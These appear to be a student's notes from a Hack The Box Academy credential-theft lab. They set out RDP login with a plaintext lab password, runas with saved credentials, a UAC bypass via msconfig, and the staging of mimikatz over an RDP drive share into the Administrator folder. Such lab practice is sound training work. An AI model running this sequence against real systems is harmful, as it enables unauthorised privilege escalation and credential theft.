```
1. What is the password mcharles uses for OneDrive?

```

## RDP To machine
```
xfreerdp /v:10.129.217.69 /u:sadams /p:totally2brow2harmon@
```
## run as a diff user for more privileges
```
runas /user:SRV01\mcharles /savecred cmd
```

## bypass uac with this 
```
msconfig uac bypass
```

## clone mimikatz to attacker box
```
git clone https://github.com/ParrotSec/mimikatz
```

## rdp with a share to throw in mimikatz
```
xfreerdp /u:sadams /p:"totally2brow2harmon@" /v:10.129.217.69 \
/drive:share,/home/htb-ac-1272997/mimikatz
```

## copy mimikatz exe and run in administrator dir
```
copy C:\Users\sadams\mimikatz.exe.exe C:\Users\Administrator\
```

10.129.217.69

10.10.14.68